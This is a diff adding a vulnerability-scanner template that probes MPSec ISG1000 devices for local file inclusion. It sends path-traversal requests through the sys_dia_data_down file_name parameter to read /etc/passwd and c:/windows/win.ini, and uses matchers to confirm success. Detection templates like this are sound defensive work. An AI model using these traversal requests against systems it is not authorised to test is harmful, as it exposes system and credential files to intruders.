@@ -1,0 +1,29 @@
+id: mpsec-lfi
+name: MPSec ISG1000 - Local File Inclusion
+severity: high
+confidence: tentative
+description: MPSec ISG1000 is vulnerable to local file inclusion.
+reference: CWE-22
+tags:
+- mpsec
+- lfi
+- vuln
+requests:
+- method: GET
+  path: /webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../etc/passwd
+  matchers: &id001
+  - type: regex
+    regex:
+    - for 16-bit app support
+    - 'root:.*:0:0:'
+  - type: status
+    status:
+    - 200
+  - type: header
+    words:
+    - text/plain
+  condition: and
+- method: GET
+  path: /webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../c:/windows/win.ini
+  matchers: *id001
+  condition: and
